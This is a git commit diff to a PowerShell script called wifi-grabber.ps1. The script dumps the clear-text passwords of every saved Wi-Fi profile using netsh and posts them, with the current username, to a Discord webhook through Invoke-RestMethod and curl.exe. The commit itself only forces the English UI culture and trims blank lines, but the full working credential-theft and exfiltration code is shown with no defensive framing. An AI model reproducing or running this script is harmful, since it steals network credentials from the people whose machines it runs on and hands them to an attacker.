57fd9a7711e1e2f151e2e2317292cf4ec68ff005
nidez <pistolesi.marco@gmail.com>
2024-01-24 02:00:48 +0100

    Update wifi-grabber.ps1

--- wifi-grabber.ps1
+++ wifi-grabber.ps1
@@ -1,4 +1,5 @@
 ############################################################################################################################################################
+[cultureinfo]::CurrentUICulture = 'en-US'
 $wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 ############################################################################################################################################################
@@ -6,7 +7,6 @@ $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 
 
 function Upload-Discord {
-
 [CmdletBinding()]
 param (
     [parameter(Position=0,Mandatory=$False)]
@@ -14,20 +14,14 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
 $hookurl = "$dc"
-
 $Body = @{
   'username' = $env:username
   'content' = $text
 }
-
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "IT: $wifiProfiles_IT"}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "EN: $wifiProfiles_EN"}
-
- 
